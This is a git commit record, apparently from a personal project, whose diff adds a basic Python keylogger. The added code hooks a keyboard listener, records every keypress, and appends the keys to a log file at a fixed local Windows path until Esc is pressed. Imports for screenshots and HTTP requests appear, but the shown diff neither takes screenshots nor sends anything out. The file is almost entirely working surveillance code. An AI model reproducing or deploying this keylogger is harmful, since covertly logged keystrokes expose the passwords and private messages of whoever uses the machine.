eb70e3661bbc6597561e337c721b4b3b65a6f465
Yaseen <yaseenbinashraf469@gmail.com>
2026-01-30 20:36:22 +0530

    basic keylogger

--- Project/keylogger.py
+++ Project/keylogger.py
@@ -27,3 +27,40 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+key_information = "key_log.txt"
+
+file_path = "C:\\Yaseen\\Projects\\Key_Logger_Python\\Project"
+extend = "\\"
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count 
+
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(file_path + extend + key_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener: 
+    listener.join()
